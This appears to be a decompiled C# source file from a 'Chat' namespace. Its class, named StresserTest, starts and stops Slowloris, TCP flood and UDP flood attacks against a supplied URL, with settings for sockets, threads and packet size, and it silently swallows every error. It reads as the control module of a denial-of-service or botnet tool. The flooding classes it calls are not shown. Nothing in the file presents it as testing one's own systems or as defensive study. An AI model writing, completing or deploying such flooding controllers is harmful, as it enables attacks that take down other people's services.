namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;

    public class StresserTest
    {
        private SlowLorisClass SlowLorisAttack;

        public void StartSlowLorisSUB(string URL, int SocketForThread, int TotThread)
        {
            try
            {
                this.SlowLorisAttack = new SlowLorisClass();
                this.SlowLorisAttack.UrlAttack = URL;
                this.SlowLorisAttack.ThreadSocket = SocketForThread;
                this.SlowLorisAttack.TotalThreadOpen = TotThread;
                this.SlowLorisAttack.StartAttack();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void StartTCPSUB(string URL, int SizePack, int Threads)
        {
            try
            {
                if (!TCPStresser.Alive)
                {
                    TCPStresser.URLS = URL;
                    TCPStresser.Size = SizePack;
                    TCPStresser.jThre = Threads;
                    TCPStresser.StartAttack();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void StartUDPSub(string URL4, int Packet, int Threads)
        {
            try
            {
                if (!UDPClass.IsAlive)
                {
                    UDPClass.UrlAttack = URL4;
                    UDPClass.PackteSize = Packet;
                    UDPClass.Threads = Threads;
                    UDPClass.Start();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void StopSlowLorisSub()
        {
            try
            {
                this.SlowLorisAttack.StopAllThread();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void StopTCPSUB()
        {
            try
            {
                if (TCPStresser.Alive)
                {
                    TCPStresser.StopAttack();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void StopUDPSub()
        {
            try
            {
                if (UDPClass.IsAlive)
                {
                    UDPClass.CheckStatus();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
    }
}

